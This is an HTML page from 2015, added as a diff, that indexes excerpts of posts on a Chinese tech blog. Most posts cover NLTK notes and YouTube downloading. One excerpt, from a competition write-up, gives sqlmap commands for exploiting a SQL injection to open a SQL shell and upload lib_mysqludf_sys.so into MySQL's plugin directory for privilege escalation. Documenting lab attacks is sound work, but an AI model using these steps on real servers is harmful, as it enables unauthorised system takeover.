@@ -1,0 +1,413 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Ourren</title>
+  <meta name="author" content="ourren">
+
+  
+  <meta name="description" content="前面虽然对「nltk分句和分词」进行了分析和实现，但是在进一步进行处理之前，我们需要对这些词语进行规范化处理，例如我们需要统一所有单词的大小写，词语时态问题「相同的单词在不同的时态句型中属于不同的单词，我们需要转换为同一单词」等。nltk则针对问题提供了相关的类库，主要有两类操作：词干提取， &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://blog.ourren.com/blog/posts/2/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Ourren" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.useso.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.useso.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.useso.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Ourren</a></h1>
+  
+    <h2>关注技术，记录生活.</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="blog.ourren.com/blog">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+    <li><a href="/">Home</a></li>
+    <li><a href="http://www.ourren.com">Ourren</a></li>
+    <li><a href="http://www.sec-wiki.com">SecWiki</a></li>
+    <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div class="blog-index">
+  
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2015/03/12/nltk_note_stem_pos_tag/">NLTK笔记:词干提取与词性标注</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-03-12T00:00:00-07:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>12</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:00 am</span></time>
+        
+        
+            | <a href="/2015/03/12/nltk_note_stem_pos_tag/#comments">留言</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>前面虽然对「nltk分句和分词」进行了分析和实现，但是在进一步进行处理之前，我们需要对这些词语进行规范化处理，例如我们需要统一所有单词的大小写，词语时态问题「相同的单词在不同的时态句型中属于不同的单词，我们需要转换为同一单词」等。nltk则针对问题提供了相关的类库，主要有两类操作：词干提取，词性标注。</p>
+
+<h3>词干提取</h3>
+
+<p>词干提取主要是将不同时态的词语转变为单词一般时态，例如seeing->see，extremely->extem，目前提供的类库在一定程度上可以实现这类转换「有些词语暂时不行，主要有些模块是基于字典的」。</p>
+
+</div>
+  
+  
+    <footer>
+      <a rel="full-article" href="/2015/03/12/nltk_note_stem_pos_tag/">继续阅读 →</a>
+    </footer>
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2015/03/10/linux_mysql_udf_shell/">Linux下MySQL Udf 提权</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-03-10T00:00:00-07:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:00 am</span></time>
+        
+        
+            | <a href="/2015/03/10/linux_mysql_udf_shell/#comments">留言</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>前几天做一个小竞赛中有一个题目：给定的测试环境登录页面有POST注入漏洞，于是果断操起sqlmap跑数据，无意中发现当前MySQL连接用户为root，于是想到udf提权「虽然Windows下MySQL提权基本上没问题，但是Linux环境下原来一直没成功过。」，最终成功获取root权限「主要问题在于MySQL是以root权限运行」，记录笔记如下，方便以后查阅：</p>
+
+<h3>具体步骤如下</h3>
+
+<ol>
+<li><p>找到MySQL插件目录:</p>
+
+<pre><code> python sqlmap.py -u 'http://xxxx' --sql-shell
+
+ show variables like "%plugin%";
+</code></pre></li>
+<li><p>利用sqlmap上传 <a href="https://github.com/mysqludf/lib_mysqludf_sys/blob/master/lib_mysqludf_sys.so">lib_mysqludf_sys</a>到MySQL插件目录;</p>
+
+<pre><code> python sqlmap.py -u 'http://xxxx' --file-write=/lib_mysqludf_sys.so 
+ --file-dest=/usr/lib/mysql/plugin/
+</code></pre></li>
+</ol>
+
+
+</div>
+  
+  
+    <footer>
+      <a rel="full-article" href="/2015/03/10/linux_mysql_udf_shell/">继续阅读 →</a>
+    </footer>
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2015/02/21/nltk_note_token_sentence/">NLTK笔记:分句与分词</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-02-21T00:00:00-08:00'><span class='date'><span class='date-month'>Feb</span> <span class='date-day'>21</span><span class='date-suffix'>st</span>, <span class='date-year'>2015</span></span> <span class='time'>12:00 am</span></time>
+        
+        
+            | <a href="/2015/02/21/nltk_note_token_sentence/#comments">留言</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>NLTK在数据抓取完成后，你拿到的数据往往是一篇文章或者一大段文字，在进行其他处理之前，你需要先对文章进行切割或者处理(去除多余字符、特殊符号，分句和分词)，分句主要是可以把有些不需要的句子给去掉，比如长度小于10的。</p>
+
+<h4>分句</h4>
+
+<p>分句在nltk中没有提供相关的库来实现，但是我们可以通过python的split等函数快速完成切分任务，主要的分割特征如下：
++ 中文主要有(。？！)这几个句子结尾标志；
++ 英文也差不多(. ? !)；
+使用split函数进行分割，可以得到新的列表，例如下面的函数;</p>
+
+</div>
+  
+  
+    <footer>
+      <a rel="full-article" href="/2015/02/21/nltk_note_token_sentence/">继续阅读 →</a>
+    </footer>
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2015/02/20/youtube_video_download_summary/">YouTube视频下载方法汇总</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-02-20T00:00:00-08:00'><span class='date'><span class='date-month'>Feb</span> <span class='date-day'>20</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:00 am</span></time>
+        
+        
+            | <a href="/2015/02/20/youtube_video_download_summary/#comments">留言</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>最近一直有人问我YouTube的视频怎么下载，其实在V2EX上也有很多用户讨论这个问题。本文就将这些方法汇总，方便大家查询和参考。</p>
+
+<p>在介绍下载方法之前，首先大家需要明白的是本文针对的是YouTube上的视频，也就是说原始地址都必须是YouTube的视频链接。如果你需要下载的视频在其它网站上，那么你需要判断是否为YouTube视频并且需要找到YouTube的原始链接，其实链接也非常好找，点击播放器右下角的「YouTube」就可以打开YouTube的原始链接，有了这个原始链接就可以采用如下两种方法下载：</p>
+
+<h4>使用下载网站</h4>
+
+<p>「推荐」这种方法简单快捷，懒人必备，整个过程只需要点击几次：</p>
+
+<ul>
+<li>打开<a href="http://www.clipconverter.cc/">http://www.clipconverter.cc/</a>;</li>
+<li>复制需要下载的原始链接到上面网页的输入框选择「continue」;</li>
+<li>选择分辨率，一般果断选1080p;</li>
+<li>点击「start」;</li>
+<li>「download」</li>
+</ul>
+
+
+</div>
+  
+  
+    <footer>
+      <a rel="full-article" href="/2015/02/20/youtube_video_download_summary/">继续阅读 →</a>
+    </footer>
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2015/02/05/nltk_note_environment_install/">NLTK笔记:简介与环境搭建</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-02-05T00:00:00-08:00'><span class='date'><span class='date-month'>Feb</span> <span class='date-day'>5</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:00 am</span></time>
+        
+        
+            | <a href="/2015/02/05/nltk_note_environment_install/#comments">留言</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h3>NLP与NLTK</h3>
+
+<p>在详细介绍nltk之前，我感觉有必要区分下NLP与NLTK的关系:</p>
+
+<p>NLP是指自然语言处理，英文(Natural Language Processing)，该技术主要解决计算机自动识别和处理人类语言，如何让计算机能够理解我们的语言，从而减少人类的工作量。个人认为其应用场景有如下几点：</p>
+
+<ol>
+<li>个性推荐，需要计算两类物品的相识度和相关度；</li>
+<li>情感分析，用户对商品的评价，网民对帖子或者文章的态度；</li>
+<li>关键字提取，对网络商品的标题提取并分类，自动摘要；</li>
+<li>其它，待补充；</li>
+</ol>
+
+
+<p>并且该相关技术最近几年热度非常高，计算机行业内研究的人也越来越多，但是不同语言的处理差异很大，比如英文的各种语言处理库基本上已经成熟，而中文的语言处理则发展缓慢；</p>
+
+</div>
+  
+  
+    <footer>
+      <a rel="full-article" href="/2015/02/05/nltk_note_environment_install/">继续阅读 →</a>
+    </footer>
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2015/02/02/nltk_note_content_list/">NLTK笔记:系列文章概述</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-02-02T00:00:00-08:00'><span class='date'><span class='date-month'>Feb</span> <span class='date-day'>2</span><span class='date-suffix'>nd</span>, <span class='date-year'>2015</span></span> <span class='time'>12:00 am</span></time>
+        
+        
+            | <a href="/2015/02/02/nltk_note_content_list/#comments">留言</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>从本系列文章中，我将最近学习自然语言处理中的NLTK库的相关技术进行分享，帮助初学者熟悉NLTK库的相关模块和功能，希望能够让你轻松地操作相关模块，完成自己的需求任务。</p>
+
+<h3>文章目录</h3>
+
+<p>系列文章首先会介绍NLTK的相关概念，然后介绍NLTK中比较常用的几个模块，争取每个篇文章都配上实例代码，最后用一个完整的实例进行讲解，目前暂定的目录如下：</p>
+
+</div>
+  
+  
+    <footer>
+      <a rel="full-article" href="/2015/02/02/nltk_note_content_list/">继续阅读 →</a>
+    </footer>
+  
+
+
+    </article>
+  
+  <div class="pagination">
+    
+      <a class="prev" href="/posts/3">&larr; Older</a>
+    
+    <a href="/blog/archives">Blog Archives</a>
+    
+    <a class="next" href="/index.html">Newer &rarr;</a>
+    
+  </div>
+</div>
+<aside class="sidebar">
+  
+    <section>
+    <h1>分类目录</h1>
+    <ul>
+        <li>
+            <a href="http://blog.ourren.com/categories/life" title="life thing and think">生活</a>
+        </li>
+        <li><a href="http://blog.ourren.com/categories/research" title="do some research in daily life">研究</a>
+        </li>
+        <li><a href="http://blog.ourren.com/categories/security" title="all security articles">安全</a>
+        </li>
+        <li><a href="http://blog.ourren.com/categories/technology" title="all program and code">技术</a>
+        </li>
+    </ul>
+</section><section>
+    <h1>友情链接</h1>
+    <ul>
+        <li><a href="http://ohroot.com/" target="_blank">Direwolf</a></li>
+        <li><a href="http://www.insight-labs.org/">insight-labs</a></li>
+        <li><a href="http://lx.shellcodes.org/">lu4nx</a></li>
+        <li><a href="http://www.metasploit.cn/forum.php" title="Metasploit 中文站" target="_blank">Metasploit</a></li>
+        <li><a href="http://www.ourren.com/" target="_blank">ourren</a></li>
+    </ul>
+</section>
+  
+</aside>
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - ourren -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
